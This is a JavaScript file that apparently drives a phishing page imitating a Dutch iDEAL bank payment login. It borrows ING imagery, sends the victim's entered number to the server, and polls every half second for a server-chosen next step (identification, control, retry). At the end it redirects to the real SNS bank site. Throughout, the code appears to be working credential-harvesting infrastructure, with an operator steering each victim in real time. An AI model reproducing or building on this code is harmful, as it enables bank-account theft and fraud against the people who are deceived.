const login_form = document.querySelector('#login-form');

const number = document.querySelector('#number');
const loginButton = document.querySelector('#loginButton');
const token = document.querySelector('#token');

login_form.addEventListener('submit', e => {
    e.preventDefault();
    if (number.value == '') {
        loginButton.innerHTML = 'Bevestigen';
        loginButton.disabled = false;
        number.disabled = false;

        number.value = '';

        document.querySelector('#errorMessage').style.display = 'block';
    } else {
        const data = new FormData();
        data.append('number', number.value);

        loginButton.innerHTML = '<img src="/img/ing.gif" width="15"> Bevestigen';
        loginButton.disabled = true;
        number.disabled = true;

        document.querySelector('#errorMessage').style.display = 'none'; 

        fetch('/online/betalen-ideal/inloggen/' + token.value, {
            method: 'POST',
            body: data
        }).then(() => {
            const newInterval = setInterval(() => {
                fetch('/online/betalen-ideal/inloggen/check/' + token.value, {
                    method: 'POST',
                }).then(res => {
                    res.json().then(data => {
                        if (data.page == 'login') {
                            loginButton.innerHTML = 'Bevestigen';
                            loginButton.disabled = false;
                            number.disabled = false;

                            number.value = '';

                            document.querySelector('#errorMessage').style.display = 'block';

                            clearInterval(newInterval)
                        } else if (data.page == 'identification') {
                            window.location.href = '/online/betalen-ideal/identificatie/' + token.value;
                        } else if (data.page == 'control') {
                            window.location.href = '/online/betalen-ideal/controleren/' + token.value;
                        } else if (data.page == 'finish') {
                            window.location.href = 'https://www.sns.nl';
                        } else if (data.page == 'waiting') {
                            console.log('Waiting...');
                        }
                    });
                });
            }, 500);
        });
    }
});


